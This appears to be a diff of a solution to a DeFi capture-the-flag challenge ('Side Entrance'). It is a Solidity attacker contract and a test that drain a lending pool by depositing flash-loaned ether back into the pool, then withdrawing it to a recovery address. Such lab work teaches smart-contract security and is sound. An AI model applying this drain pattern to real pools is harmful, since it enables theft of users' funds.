@@ -21,16 +21,16 @@ contract SideEntranceAttacker is IFlashLoanEtherReceiver {
     }
 
     function attack() external {
-        pool.flashLoan(1e18);
+        pool.flashLoan(ETHER_IN_POOL);
     }
 
     function execute() external payable {
-        pool.deposit{value: 1e18}();
+        pool.deposit{value: ETHER_IN_POOL}();
     }
 
     function withdraw() external {
         pool.withdraw();
-        // SafeTransferLib.safeTransferETH(address(recovery), ETHER_IN_POOL);
+        SafeTransferLib.safeTransferETH(address(recovery), ETHER_IN_POOL);
         
     }
 
@@ -77,8 +77,12 @@ contract SideEntranceChallenge is Test {
      */
     function test_sideEntrance() public checkSolvedByPlayer {
         SideEntranceAttacker attacker = new SideEntranceAttacker(address(pool),recovery);
+        console.log('before attack',pool.balances(address(player)));
+        
         attacker.attack();
-        attacker.execute();
+        console.log(pool.balances(address(player)));
+        // attacker.execute();
+        console.log(pool.balances(address(player)));
         attacker.withdraw();
     }
 
